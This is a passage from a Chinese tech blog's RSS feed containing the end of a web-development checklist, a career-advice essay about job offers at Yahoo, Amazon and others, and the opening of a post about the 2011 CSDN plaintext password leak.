<li>了解 <a href="https://www.pcisecuritystandards.org/" rel="nofollow">处理信用卡的一些规则 </a>. (<a href="https://stackoverflow.com/questions/51094/payment-processors-what-do-i-need-to-know-if-i-want-to-accept-credit-cards-on-m">这里也有一个问题你可以查看一下</a>) （陈皓注：有两上vendor可以帮助你，一个是 <a href="https://www.authorize.net/" rel="nofollow">Authorize.Net</a> 另一个是 <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_payflow-pro-overview-outside" rel="nofollow">PayFlow Pro</a>）</li>
</ul>
<ul>
<li>使用 <a href="https://www.mozilla.org/projects/security/pki/nss/ssl/draft302.txt" rel="nofollow">SSL</a>/<a href="https://en.wikipedia.org/wiki/Https" rel="nofollow">HTTPS</a> 来加密传输登录页面或是任可有敏感信息的页面，比如信用卡号等。</li>
</ul>
<ul>
<li>知道如何对付session 劫持。（陈皓注：请参看wikipedia的这<a href="https://en.wikipedia.org/wiki/Session_hijacking" target="_blank">Session Hijacking</a>，）</li>
</ul>
<ul>
<li>避免 <a href="https://en.wikipedia.org/wiki/Cross-site_scripting" rel="nofollow">跨站脚本攻击</a>(XSS)。（陈皓注：参看酷壳站前几天发的《<a title="新浪微博的XSS攻击" href="https://coolshell.cn/articles/4914.html" target="_blank">新浪微博的XSS攻击事件</a>》）</li>
</ul>
<ul>
<li>避免 <a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery" rel="nofollow">跨站</a><a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery" rel="nofollow">伪造</a><a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery" rel="nofollow">请求攻击 cross site request forgeries</a> (XSRF).</li>
</ul>
<ul>
<li>保持你的系统里的所有软件更新到最新的patch。</li>
</ul>
<ul>
<li>确保你的数据库连接是安全的。</li>
</ul>
<ul>
<li>确保你能了解最新的攻击技术，以及你系统的脆弱处。</li>
</ul>
<ul>
<li>请读一下 <a href="https://code.google.com/p/browsersec/wiki/Main" rel="nofollow">The Google Browser Security Handbook</a>.</li>
</ul>
<ul>
<li>请读一下 <a href="http://rads.stackoverflow.com/amzn/click/0470170778" rel="nofollow">The Web Application Hacker’s Handbook</a>.</li>
</ul>
<ul>
<li>（陈皓注：之前本站的“<a title="一些文章资源和趣闻" href="https://coolshell.cn/articles/5537.html" target="_blank">一些资源</a>”提到过<a href="https://wiki.mozilla.org/WebAppSec/Secure_Coding_Guidelines" target="_blank">Mozilla的安全编程规范</a>，还有Ruby on Rails的<a href="http://guides.rubyonrails.org/security.html" target="_blank">Web安全的开发教程</a>）</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%80%A7%E8%83%BD"></span><strong>性能</strong><span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>只要需要，请实现cache机制，了解并合理地使用 <a href="https://www.mnot.net/cache_docs/" rel="nofollow">HTTP caching</a> 以及 <a href="https://www.w3.org/TR/html5/offline.html" rel="nofollow">HTML5 Manifest</a>.</li>
</ul>
<ul>
<li>优化页面 —— 不要使用20KB图片来平铺网页背景。（陈皓注：还有很多网页页面优化性的文章，你可以STFG – Search The Fucking Google一下。如果你要调试的话，你可以使用firebug或是chrome内置的开发人员的工具来查看网页装载的性能）</li>
<li>学习如何 <a title="gzip content" href="https://developer.yahoo.com/performance/rules.html#gzip" rel="nofollow">gzip/deflate 网页</a> (<a href="https://stackoverflow.com/questions/1574168/gzip-vs-deflate-zlib-revisited">deflate 更好</a>).</li>
</ul>
<ul>
<li>把多个CSS文件和Javascript文件合并成一个，这样可以减少浏览器的网络连数，并且使用gzip压缩被反复用到的文件。</li>
</ul>
<ul>
<li>学习一下 <a href="https://developer.yahoo.com/performance/" rel="nofollow">Yahoo Exceptional Performance</a> 这个网站上的东西，上面有很多非常不错的改善前端性能的指导，以及 <a href="https://developer.yahoo.com/yslow/" rel="nofollow">YSlow</a> 这个工具。 <a href="https://code.google.com/speed/page-speed/docs/rules_intro.html" rel="nofollow">Google page speed</a> 是另一个用来做性能采样的工具。这两个工具都需要安装 <a href="https://getfirebug.com/" rel="nofollow">Firebug</a> 。</li>
</ul>
<ul>
<li>为那些小的图片使用 <a href="http://alistapart.com/articles/sprites" rel="nofollow">CSS Image Sprites</a>，就像工具条一样。 (参看 “最小化 HTTP 请求” ) （陈皓注：把所有的小图片合并成一个图片，然后用CSS把显示其中的一块，这样，这些小图片只用传输一次，酷壳的Wordpress样式的那个RSS订阅列表中的小图标就是这样做的）</li>
</ul>
<ul>
<li>繁忙的网络应该考虑<a href="https://developer.yahoo.com/performance/rules.html#split" target="_blank">把网页的内容分开存放</a>在不同的域名下。（陈皓注：比如有专门的图片服务器——图片相当耗带宽，或是专门的Ajax服务器）</li>
</ul>
<ul>
<li>静态网页 (如，图片，CSS，JavaScript，以及一些不需要访问cookies的网页) 应该放在一个<a href="https://blog.stackoverflow.com/2009/08/a-few-speed-improvements/" target="_blank">不使用cookies</a>的独立的域名下，因为所有在同一个域名或子域名下的cookie会被这个域名下的请求一同发送。另一个好的选择是使用 Content Delivery Network (CDN).</li>
</ul>
<ul>
<li>使用单个页面的HTTP请求数最小化。</li>
</ul>
<ul>
<li>为Javascript使用 <a href="https://code.google.com/closure/compiler/" rel="nofollow">Google Closure Compiler</a> 或是 <a href="https://developer.yahoo.com/yui/compressor/" rel="nofollow">其它压缩工具</a>（陈皓注：压缩Javascript代码可以让你的页面减少网络传输从而可以得到很快的喧染。注意，并不是所有的工具都可以正确压缩Javascript的，Google的这个工具甚至还可以帮你优化你的代码）</li>
</ul>
<ul>
<li>确认你的网站有一个 <code>favicon.ico</code> 文件放在网站的根下，如 <code>/favicon.ico</code>. <a href="https://mathiasbynens.be/notes/rel-shortcut-icon" rel="nofollow">浏览器会自动请求这个文件</a>，就算这个图标文件没有在你的网页中明显说明，浏览器也会请求。如果你没有这个文件，就会出大量的404错误，这会消耗你的服务器带宽。（陈皓注：服务器返回404页面会比这个ico文件可能还大）</li>
</ul>
<h4>
<span class="ez-toc-section" id="SEO_%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BC%98%E5%8C%96"></span><strong>SEO (搜索引擎优化)</strong><span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>使用 “搜索引擎喜欢的” URL，如：使用 <code>example.com/pages/45-article-title</code> 而不是 <code>example.com/index.php?page=45 </code>(陈皓注：这里的URL是说Wordpress的，后者是默认的)</li>
</ul>
<ul>
<li>如果你的动态页面要使用 <code>#</code> ，那么请把其改成 <code>#!</code> ，而在服务端，你需要处理<code>$_REQUEST["_escaped_fragment_"]</code> 这是Google搜索引擎需要的。换句话说，<code>./#!page=1</code> 会被Google搜索引擎转成 <code>./?_escaped_fragments_=page=1。</code> （陈皓注：通常来说URL中的#后的东西都不会被传到服务器上，所以，为了要让Google可以抓取AJAX的东西，你需要使用#!，而Google会把“#!”转成“_escaped_fragment_”来向服务器发请求，Twitter的大量的链接者是#!的，比如：<a href="https://twitter.com/#!/your_activity">https://twitter.com/#!/your_activity</a>）。另外，用户也许会使用Firefox 或 Chromium， <code>history.pushState({"foo":"bar"}, "About", "./?page=1");</code> 是一个很不错的命令。所以，就算是我们的地址栏上的地址改变了，页面也不会重新装载。这可以让你使用 <code>?</code> 而不是 <code>#!</code> 也能无刷地保住当前的动态的页面，这可以让AJAX的请求被浏览器记住。</li>
</ul>
<ul>
<li>别使用 “click here” 这样的链接。这样一来，无法SEO，而且对于一些需要使用读屏人来说很不友好（陈皓注：关于读屏软件，可参看本站的“<a title="如果你看不见你还能编程吗？" href="https://coolshell.cn/articles/5514.html" target="_blank">如果看不见你还能编程吗</a>”）</li>
</ul>
<ul>
<li>做一个 <a href="http://www.sitemaps.org/" rel="nofollow">XML sitemap</a>，并放在网端的根下 <code>/sitemap.xml</code>. （陈皓注：这个文件可以让搜索引擎了解你的网站图）</li>
<li>当你有多个URL指向同一个网页的使用，使用 <a href="https://googlewebmastercentral.blogspot.com/2009/02/specify-your-canonical.html" rel="nofollow"><code>&lt;link rel="canonical" ... /&gt;</code></a> 你可以使用 <a href="https://www.google.com/webmasters/" rel="nofollow">Google Webmaster Tools</a> 来查看相关的问题。</li>
</ul>
<ul>
<li>使用 <a href="https://www.google.com/webmasters/" rel="nofollow">Google Webmaster Tools</a> 和 <a href="http://siteexplorer.search.yahoo.com/" rel="nofollow">Yahoo Site Explorer</a>.</li>
</ul>
<ul>
<li>安装 <a href="https://www.google.com/analytics/" rel="nofollow">Google Analytics</a>  (或是别的开源的网站分析工具，如： <a href="https://piwik.org/" rel="nofollow">Piwik</a>).</li>
</ul>
<ul>
<li>了解 <a href="https://en.wikipedia.org/wiki/Robots_exclusion_standard" rel="nofollow">robots.txt</a> 和搜索引擎爬虫是如何工作的。</li>
</ul>
<ul>
<li>重定向请求 (使用 <code>301 重定向网站</code>) ，如果你要把 <code>www.example.com</code> 定向到 <code>example.com</code>(或是其它的变更) 这样可以防止Google的rank因为域名的变化发生改变。（陈皓注：301重定向一般用作域名变更）</li>
</ul>
<ul>
<li>知道并不是所有的爬虫都是好的，有些爬虫的行为并不好。（陈皓注：比如向你的网站发大量的请求导致服务器性能低下）</li>
</ul>
<ul>
<li>如果你有一些非文本的内容需要在 Google’s sitemap  中，比如视频什么的。<a href="https://stackoverflow.com/questions/72394/what-should-a-developer-know-before-building-a-public-web-site#167608">Tim Farley的答案</a>，可以让你看到很多有价值的东西。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%8A%80%E6%9C%AF"></span><strong>技术</strong><span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>理解什么是 <a href="https://www.ietf.org/rfc/rfc2616.txt" rel="nofollow">HTTP</a> 比如 GET, POST, sessions, cookies等，了解什么是 “stateless” 无状态。</li>
</ul>
<ul>
<li>让你的 <a href="https://www.w3.org/TR/xhtml1/" rel="nofollow">XHTML</a>/<a href="https://www.w3.org/TR/REC-html40/" rel="nofollow">HTML</a> 和 <a href="https://www.w3.org/TR/CSS2/" rel="nofollow">CSS</a> 符合 <a href="https://www.w3.org/TR/" rel="nofollow">W3C 规范</a>，并确认他们都是 <a href="https://validator.w3.org/" rel="nofollow">合格的</a>。我们的目标是避免浏览器的 “quirks mode”，并且可以让其更容易地能和非标准的浏览器工作，比如读屏器或移动设备。</li>
</ul>
<ul>
<li>理解浏览器是怎么处理 JavaScript 的。（陈皓：你会看到有些Javascript代码在页面上前面，有些则是在后面，所以你需要对其了解清楚为什么是这样）</li>
</ul>
<ul>
<li>了解浏览器是怎么装载 JavaScript，CSS和其它资源的，了解其对视觉上的影响。（陈皓注：10年前我做网页的时候因为HTML还很弱，所以只能使用table来布局，使用table布局的问题就是整个table读完后页面才会显示，用户的视觉体验并不好）。在某些情况下，你可能需要<a href="https://developer.yahoo.com/" target="_blank">把你的脚本放在页面的后面</a>。</li>
</ul>
<ul>
<li>理解 JavaScript 的 sandbox 是怎么怎么工作的，尤其是你想使用iframes。</li>
</ul>
<ul>
<li>请注意 JavaScript 可能会被禁止，这样会让你的AJAX失效。就算是大多数用户都开启了Javascript功能，但是也可能在一些情况下脚本是不被运行的，比如移动终端上，搜索引擎抓网页的时候也并不会执行你的脚本。</li>
</ul>
<ul>
<li>学习 <a href="http://www.bigoakinc.com/blog/when-to-use-a-301-vs-302-redirect/" rel="nofollow">301 和 302 转向的区别</a> (这也是一个SEO的问题).</li>
</ul>
<ul>
<li>尽可能多地学习你的部署平台。（比如：操作系统，Web Server：Apache/Nginx，防火墙，数据库，等等）</li>
</ul>
<ul>
<li>考虑使用一个 <a href="https://stackoverflow.com/questions/167531/is-it-ok-to-use-a-css-reset-stylesheet">Reset Style Sheet</a>.</li>
</ul>
<ul>
<li>考虑使用 JavaScript 框架(如： <a href="https://jquery.com/" rel="nofollow">jQuery</a>, <a href="http://mootools.net/" rel="nofollow">MooTools</a>, <a href="http://www.prototypejs.org/" rel="nofollow">Prototype</a>, <a href="https://dojotoolkit.org/" rel="nofollow">Dojo</a> 或 <a href="https://developer.yahoo.com/yui/3/" rel="nofollow">YUI 3</a>)，它们会很好的兼容于不同的浏览器。（陈皓注：强烈推荐你看一下本站的<a title="开源中最好的Web开发的资源" href="https://coolshell.cn/articles/4795.html" target="_blank">开源中最好的WEB开发资源</a>一文）</li>
</ul>
<ul>
<li>把视觉效果和JS框架合在一起讨论，考虑使用一个Service，如：<a href="https://code.google.com/apis/libraries/devguide.html" rel="nofollow">Google Libraries API</a> 来装载框架，这样可以让浏览器可能早就把这个JS框架已经cache了而不需要再从你的网站上下载了。</li>
</ul>
<h4>
<span class="ez-toc-section" id="Bug_fixing"></span><strong>Bug fixing</strong><span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>明白你会花20%的时间写代码，而80%的时候在维护，所以你要小心编码。（陈皓注：参看本站的“<a title="多些时间能少写些代码" href="https://coolshell.cn/articles/5686.html" target="_blank">多些时间可以少些代码</a>”一文）</li>
</ul>
<ul>
<li>设计一个好的错误报告机制。</li>
</ul>
<ul>
<li>设计一个入口可以让人们联系到你并给你建议和批评。</li>
</ul>
<ul>
<li>为你开发的东西形成文档，这样可以让后来的人容易维护你的软件和系统。</li>
</ul>
<ul>
<li>频繁备份（也可确保你的这些备份功能正常） <a href="https://stackoverflow.com/questions/72394/what-should-a-developer-know-before-building-a-public-web-site#73970">Ed Lucas 的回答</a> 有一些忠告。你还需要有一个恢复策略，而不只是一个备份策略。</li>
</ul>
<ul>
<li>使用一个版本控制系统来保存你的代码，如： <a href="https://subversion.apache.org/" rel="nofollow">Subversion</a> 或 <a href="http://git-scm.org/" rel="nofollow">Git</a>.</li>
</ul>
<ul>
<li>别忘了做Acceptance Testing，使用 <a href="http://seleniumhq.org/" rel="nofollow">Selenium</a> 能帮到你。</li>
</ul>
<ul>
<li>确保你有足够的日志，你可以使用 log4j, log4n 或 log4r。如果出了问题，这是可以让你快速找到问题的方式。</li>
</ul>
<ul>
<li>当你写日志的时候，确保你记录了你捕获了处理和未处理异常。报告和分析日志可以让你知道你网站的问题。</li>
</ul>
<p>这里有多的东西被省略了，并不是因为那些可能不是有帮助的答案，而是因为那些东西都太细节了，超出了这个问题的范围，因为这本来就是一个Web开发需要了解东西的Overview。我想你可以去看一下其它人的答案，我有时间，我也会补充别人的答案进来。请随意编辑这个答案，因为可能有些东西忘了，也有可能有些东西不对。</p>
<p style="text-align: left;">（全文完）</p>
<p></p>
 ]]></content>
<pubDate>2011-12-07T08:29:49+08:00</pubDate>
<guid>https://coolshell.cn/articles/6043.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 三个事和三个问题 ]]></title>
<link>https://coolshell.cn/articles/6142.html</link>
<content><![CDATA[ 
<p>从9月份开始，是很多在校毕业生的择业时期，有很多很多朋友写邮件给我让我帮他们参考如何选择工作（对不起我无法在第一时间回信，因为实在是太多了，我那繁忙工作和生活都没办法让我能即时回复），并且还有一个已经工作了多年的技术很强的朋友因为跳槽没有跳好，也和我说了很多他 的感受。从这个过程中让我有了很多感触和想法想和大家分享，本来这篇文章1个月前就想写的，只是要写下来时不知道如何整理这么多的东西和思绪。今天也不知道，但是一定要写了，不然，我的这些感触和想法就会越来越不新鲜了。</p>
<p><strong>注：这篇文章里的所有的故事都是真实的</strong>，<strong>其不可避免地会加上我<strong><strong><strong>强烈的</strong></strong></strong>个人情怀和个<strong><strong>人色彩</strong></strong></strong>，<strong>叙述的过程可能比较乱，但我能确保这些都是我的肺腑之言</strong>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%BA%8B%EF%BC%9A%E7%BD%91%E5%8F%8B%E7%9A%84%E6%9D%A5%E4%BF%A1" title="第一个事：网友的来信">第一个事：网友的来信</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E4%BA%8B%EF%BC%9AAmazon%E7%9A%84%E6%A0%A1%E5%9B%AD%E6%8B%9B%E8%81%98" title="第二个事：Amazon的校园招聘">第二个事：Amazon的校园招聘</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%AC%AC%E4%B8%89%E4%B8%AA%E4%BA%8B%EF%BC%9A%E6%9C%8B%E5%8F%8B%E7%9A%84%E8%B7%B3%E6%A7%BD" title="第三个事：朋友的跳槽">第三个事：朋友的跳槽</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%B8%89%E4%B8%AA%E9%97%AE%E9%A2%98" title="三个问题">三个问题</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%BA%8B%EF%BC%9A%E7%BD%91%E5%8F%8B%E7%9A%84%E6%9D%A5%E4%BF%A1"></span>第一个事：网友的来信<span class="ez-toc-section-end"></span>
</h4>
<p>第一个故事是一个杭州的学生的故事，其有两个offer，一个是北京的（雅虎研发中心），另一个是杭州的一个做商业智能软件的公司，也是美国的上市公司。他在给我的来信内心纠结地说：</p>
<blockquote>
<p>雅虎其实很想去，虽然这几年雅虎走下坡，但还是大公司，牌子硬，里面牛人也多，有助于自己水平的提升。但感觉北京环境不好，生活不是那么舒坦，也搞不定户口，所以我去的话也只能干个三五年就得考虑跳槽到别的城市安家落户了。这么一跳，在北京积累的各种资源却又带不走 。</p>
<p>杭州，比北京更适合生活，户口不是问题，朋友多，这个公司也比较宽松，有较多的业余时间跟朋友们一起搞点东西。而且这些年这个公司上升的势头，在国内设研发中心也才4年，规模不大，公司本身规模也还不大，我觉得机会还不错。再加上离家近，对家人大概可以多些照应。</p>
<p>关于未来换工作，雅虎做的是搜索，广告，移动互联这几个方面的，东西在互联网企业里面都比较通用，以后跳槽的话，面相对比较宽。杭州的那个做商业智能的公司，据了解其他做的比较好的也就几个大公司如SAP，IBM有这方面的业务。</p>
</blockquote>
<p>我和这个同学发了邮件，也打了长途电话，我基本上是这样回复的——</p>
<p><span id="more-6142"></span></p>
<p style="padding-left: 30px;">1）<strong>户口，离家近，安逸的生活，相比起你的人生经历，你的眼界，你的发展，什么都不是</strong>。千万不要让户口限制了你的人生，如果要过安逸轻松的生活，最佳方案是进政府部门，既然要活在体制外，就一定是靠能力，靠经历，一定要有好的经历和能力。</p>
<p style="padding-left: 30px;">2）<strong>眼界，眼界，眼界</strong>。这是我们这个国家里的人最需要的东西了，你的眼界决定了你的人生。我对杭州的这家公司一无所知，但是我知道雅虎的一些好处：a）互联网企业，其天地明显要比BI广阔很多，b）技术强，能人多（看雅虎的面试的难度以及一些产品就知道了），c）外企，可以练英语。d) 跨国公司，可以开眼界，或许会有出国机会。e）北京，几乎所有的知名公司都在这里有基地，这里的技术氛围在全国数一数二。<strong>为了经历和眼界，辛苦几年又有何妨？！人生还是需要有激情的。</strong></p>
<p style="padding-left: 30px;">3）<strong>经历，经历，经历</strong>。问自己一下，我们会在毕业的第一份工作呆上一辈子吗？不会吧。就算不喜欢北京，就算雅虎这个公司并不完美，但是雅虎的经历，能为你开启一个更为广阔的天地。</p>
<p style="padding-left: 30px;">4）我认为一个有过几乎失败经历的公司会更牛。Apple被打趴下过，Amazon也被打趴下过，<strong>只有被打趴下过而又能站起来的公司和人才是<strong>真正伟大的</strong></strong>。如果Yahoo还能站起来，它一定会是一个伟大的公司。</p>
<p>小伙子是个很聪明的人，也是个对生活有激情的人，所以，最后毁了“三方”选择了雅虎。他说：</p>
<blockquote><p>最终选择雅虎的原因是，我觉得趁早年轻先出去看看，北京还是一个开阔视野的好地方。我要是一开始就选择杭州，以后估计不太会出去了，人生短暂，我还是希望多经历一些多体会一些。我从不畏惧在北京是否有户口，那里的房价是否承受的起，我觉得一个刚毕业的学生没必要太多的考虑这些问题，最重要的是考虑自己的发展。</p></blockquote>
<p>而我的心情却有些复杂，一方面，我觉得一个人的一生可能就此被我改变了，我的心里很复杂。另一方面，万一他来北京不是很顺怎么办？会不会说我骗了他？在这里，我想对这个朋友说——“保持你的热情，努力开你的眼界，努力提高你的能力，你不可能走得不好的，就算雅虎有一天倒下了，也会有很多个更好机会等着你的，我会一直在你身边帮助你的”。</p>
<p>这样的来信还有很多很多，户口，薪资，是否去大城市，几乎都成了大家考虑的重点。这个年代实在是太浮躁了。我在此想告诉大家，对于你的人生你应该把“<strong>和什么样的人做什么样的事</strong>”提到你择业优先级最高的地位，没有之一。我的答案是，“<strong>和有激情能做事的人做有意义的事</strong>”。</p>
<p><strong>生活在如此刺激的年代，一定要去经历那些最刺激最有意义的东西，这样人生才会变得有意义。</strong></p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%BA%8C%E4%B8%AA%E4%BA%8B%EF%BC%9AAmazon%E7%9A%84%E6%A0%A1%E5%9B%AD%E6%8B%9B%E8%81%98"></span>第二个事：Amazon的校园招聘<span class="ez-toc-section-end"></span>
</h4>
<p>在Amazon校招的其间发生了一些有意思的事，比如：</p>
<p>1）在哈尔滨校招过后，我被公司里的一些同事亲切地称为“<a href="http://blog.sina.com.cn/s/blog_65f386930100ytgc.html" target="_blank">体型魁梧的男子</a>”，呵呵。希望这位同学毕业的时候还能来Amazon面试，这样，我就能再“虐你一次”。哈哈。</p>
<p>2）这次Amazon的校招在北京，天津，西安，武汉，哈尔滨等地进行了招聘，大家知道我们用什么面试题来面这些快毕业的学生吗？我们用面试高级程序员的问题来面试这些刚毕业的学生（我和我的团队里的那些高级程序员说：“你们应该庆幸你们面试的时候没有被回这些问题”）。你知道我们有什么样的收获？主要有两点收获：</p>
<ul>
<li>
<strong>武汉的学生太给力了</strong>。你们的能力超出了所有其它城市的学生，包括北京。这让我们很诧异，搞得我们几个经理都在思考是不是要去武汉建Amazon的研发分部去了。我个人的分析是：<strong>武汉属于中心城市和北京等大城市的沟通相当地好，在这里的学生和在北京的学生有一样的眼界和技术氛围，但却没有在大城市的同学们的浮燥，能踏下心来专研技术</strong>。</li>
</ul>
<ul>
<li>
<strong>学C++的同学比学Java的同学解决问题的能力更强</strong>。因为两个原因，a) C++需要了解系统知识，b) C++的程序员几乎什么事都得自己干。（参看我的《<a title="如何学好C语言" href="https://coolshell.cn/articles/4102.html" target="_blank">如何学好C语言</a>》和《<a title="如何学好C++语言" href="https://coolshell.cn/articles/4119.html" target="_blank">如何学好C++语言</a>》，当然，Java还是很牛的，比如OO方面）</li>
</ul>
<p>3）有一个同学接受了Amazon的offer后，给我来信诉说，给他打电话的经理告诉他要做的是测试为主的工作。然后，他给我发邮件来和倾诉，我说，<strong>如果你不喜欢，你就要说出来，不要将就，将就出来的人生只会平添许多烦恼和后悔</strong>。在此，我想在这里澄清两个事：</p>
<ul>
<li>Amazon不会强行把你分配到团队中，只要你有想去的团队，你就应该说出来。我们一开始会内部做分配，这样做只是为了效率，但是这并不代表你已经被最终分配到那个团队中去了，无法再调整了。只要你提出来你想做什么。我们会把你的要求放在第一位，并尽最大的可能满足你的要求。相信经理们给你们电话的时候都说过这样的内容了。</li>
</ul>
<ul>
<li>Amazon所有的“蓝卡员工”（在Amazon工作5年以内的员工）在工作满一年后，可以有条件地在Amazon内部transfer。条件只有一个：你的工作业绩要很不错，在相同级别的员工中是中坚力量。你可以直接申请其它团队的招聘职位（这个其它团队包括了美国总部在内的全世界的团队），经过流程简单的面试就可以正式transfer。没有人可以阻止你，那怕是Jeff Bezos也无权阻止你。（这个政策要比北京户口更有价值吧？！Think it Big!）</li>
</ul>
<p>4）最后一个有关校园招聘的事发生在我的团队。我觉得我可能要失去这个获得offer的学生了。他在腾讯和亚马逊之间更倾向于腾讯，因为他在腾讯实习过。他一开始的理由主要是，一个是户口问题，腾讯可以解决户口，另一个是他想做底层的C/C++，而不是Java。后面的理由又转变为腾讯的团队文化，等等。</p>
<p>我已经给他打过两次电话了，也和他说过许多，和第一个故事里说得差不多。对于是否做C/C++还是Java这方面的事，他和我说，他想在某一个领域成为一个专家。我对他说的这个专家有些模糊，我只是和他说——“<strong>软件的精髓不在于你对系统底层有多了解，也不在语言层面，而是在于设计和架构，而设计和架构这种东西只能靠多想多看</strong>”，我和他说，Amazon不是一个喜欢分享的公司，Amazon内部很多技术和设计水平可能是外部的人无法想像的。我希望他能来我的团队和大家工作一段时间真正感受一下，再做打算。（当然，要是他不明白这些事，我也觉得他不来也没有什么可惜的）</p>
<p>另外，我想对所有的人说：“<strong>这个世界上有两种公司，一种是“劳动密集型”的公司，另一种是“知识密集型”的公司，很多公司把软件做成了一种“劳动密集型”的活动，在那里永远无法做出能够让业界所震撼的东西，而有的公司才能把其做成“知识密集型”的公司，在那里，你会看到世界因为他们而改变</strong>”。如果你不能理解这句话的话，你不妨想像一个网上卖书的的公司干出连Google都赶不上的“平台”（参看“<a title="SteveY对Amazon和Google平台的长篇大论" href="https://coolshell.cn/articles/5701.html" target="_blank">Steve Y的Amazon和Google平台论</a>”），你不妨想像一个做MP3播放器的公司可以改变唱片业乃至改变世界。</p>
<p>不管这位同学最终能不能成选择我的团队的一员，我都会送你一本《Steve Jobs》，额外，我还会送你一件我团队自己制作的T恤（见下图，谢谢我的HR Recruiter当模特）。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%89%E4%B8%AA%E4%BA%8B%EF%BC%9A%E6%9C%8B%E5%8F%8B%E7%9A%84%E8%B7%B3%E6%A7%BD"></span>第三个事：朋友的跳槽<span class="ez-toc-section-end"></span>
</h4>
<p>我有一个普通朋友，几个月前跳槽去了一家正在高薪挖人的国内的快要准备IPO的公司。他们开出的薪水和条件非常地诱人。给我这个朋友的开出薪水和那个职位诱惑力太大了。一般人都很难拒绝。但是，当他入职了以后，他发现了这个公司内有很多东西是相当恶心和让他无法接受的，这个公司就可能连“劳动密集型”的公司都不算，非常发不重视技术，在技术上做的东西相当地不规范，在那里的技术人员不但相当地苦逼，而且干的事相当的垃圾，出了问题，所有的团队都在互相推诿，管理非常混乱。这让我的那个朋友非常地难受，在那里的每一天都是一种煎熬，而且他无法改变，高管也很难改变这种局面。整个公司在一种疯狂地暗无天日的状态下工作。我对这个朋友目前的善感到担忧。</p>
<p>但是，我想借这个事来谈谈我的想法。我承认薪水和职位是一种价值，但是，人生的价值只有这个吗？你一年少了那几万块钱，你也穷不了，你多了那几万块钱，你也富不了，为什么不去追求那些比那几万块钱更有价值的东西呢？对于我来说，我觉得，最有价值的东西就是——<strong>能和那些有梦想有追求有能力的人一起去经历那些最有意义的事情，那些能够造福社会、改变世界、创造历史的事情</strong>。</p>
<p>我从我的上一份工作到现在的工作，我的薪水不但没怎么涨，只是执平，而我的职位还比上一家公司降了一级（而且我还放弃两年内职位还可能再次晋升的机会），我管的团队从4个团队减到了一个很小的5个人左右的团队（现在我坚持小的团队做大事）。我来Amazon之前，这个事让我整整思考了2个多月。最终我发现，<strong>职位和薪水这些对我来说都无所谓，因为我是做事的人，而只有有意义的经历才能真正喂饱我</strong>。而我目前在Amazon里做的这个事，是可能改变历史的事，是那种可以让我一想起来就会兴奋的事。</p>
<p><strong>我知道，价值并不仅仅只是名利权，对此我只想说，不要把自己给卖了</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%89%E4%B8%AA%E9%97%AE%E9%A2%98"></span>三个问题<span class="ez-toc-section-end"></span>
</h4>
<p>其实，我还有很多故事可以讲，只不过我写得太多了，差不多到文章该结束的时候了。那些事改天再说吧。我经历的这些事让我思考了很多很多。每年年底都是我情绪比较低沉的时候，因为，这个时候是我反思一年中的得失的时候，在这个时间段里，我会有一些不安，那种我害怕已经虚度了这一年的那种不安。</p>
<p>2011年的年底，我问了我自己三个问题：</p>
<p style="padding-left: 30px;"><strong>1）每天早上醒过来的时候，我会为什么感到兴奋？是什么在驱动着我去开始新的一天？</strong></p>
<p style="padding-left: 30px;"><strong>2）现在的经历有没有让我有这种兴奋的感觉？这种让我充满力量和期待的感觉？</strong></p>
<p style="padding-left: 30px;"><strong>3）有没有浮燥，有没有得到认可？身边的人的认可？但更重要的是自己是否对自己认可？</strong></p>
<p style="text-align: left;">我把我自己的这三个问题共享给大家，我有我的答案，相信你也有你的答案。</p>
<p style="text-align: center;"><strong>在2011年的年底，我希望大家的2011年没有虚度，而2012年能经历那些有意义的的事。</strong></p>
<p style="text-align: center;"><span style="color: #cc0000; font-size: 16pt; font-family: 'Microsoft YaHei';"><strong>提前祝大家新年快乐！</strong></span></p>
<p></p>
 ]]></content>
<pubDate>2011-12-20T08:39:41+08:00</pubDate>
<guid>https://coolshell.cn/articles/6142.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ CSDN明文口令泄露的启示 ]]></title>
<link>https://coolshell.cn/articles/6193.html</link>
<content><![CDATA[ 
<p>2011年12月21日晚，某计算机专业的大学生寝室，某同学大叫到：“兄弟们，最新的日本XX女星的AV片已经下好，大家快过来看啊，相当精彩啊~~~”，然而，这个寝室里的其它同学似乎没有听到这哥们的呼喊，于是，这哥们又叫了三次，没有人理他，因为大家都在眉飞色舞地谈论着CSDN的明文密码和用户帐号泄露的事情，并在网上查找着下载CSDN那600万的用户数据……上面这个故事是我编的，只是想描述一下昨晚的情形。</p>
